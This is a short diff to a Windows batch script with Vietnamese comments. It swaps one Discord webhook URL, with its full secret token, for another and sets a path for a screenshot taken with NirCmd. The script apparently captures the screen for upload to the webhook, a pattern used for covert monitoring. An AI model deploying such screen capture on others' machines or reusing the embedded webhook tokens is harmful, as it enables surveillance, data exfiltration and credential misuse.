@@ -27,7 +27,7 @@ for /f "tokens=1-3 delims=:" %%a in ("%time%") do (
 set "timestamp=%hour%h_%day%_%month%_%year%"
 
 :: URL webhook Discord của bạn
-set WEBHOOK_URL=https://discord.com/api/webhooks/1364989591286710322/11eCBT3_FDyixCKh6BE3GaG25_aEiIW8SJbrAxylI0Bmfk63YDsIzM6OKw9WVzY_SuSO
+set WEBHOOK_URL=https://discord.com/api/webhooks/1375382863633186855/s9FgLt3tHCJ6bWUjN5jEf9eZrJA2QDd5xA4eDE9Wh57H6eRbUM8v0RYC9dOfmMcu6HgR
 set SCREENSHOT_PATH=%~dp0screenshot.png
 
 :: Chụp màn hình bằng NirCmd và lưu với tên screenshot.png
